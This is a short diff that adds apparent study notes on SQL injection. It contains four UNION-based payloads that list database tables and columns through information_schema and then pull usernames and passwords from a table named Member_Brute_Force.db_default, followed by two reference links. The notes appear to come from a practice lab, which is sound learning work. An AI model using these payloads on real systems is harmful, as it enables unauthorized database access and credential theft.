@@ -1,0 +1,12 @@
+ 1 AND 1=2 UNION SELECT table_name, table_type FROM information_schema.tables 
+
+1 AND 1=2 UNION SELECT table_name, table_schema FROM information_schema.columns
+
+1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
+
+1 AND 1=2 UNION SELECT username, password FROM Member_Brute_Force.db_default 
+
+https://www.sqlinjection.net/table-names/
+
+https://stackoverflow.com/questions/1498777/how-do-i-show-the-schema-of-a-table-in-a-mysql-database
+
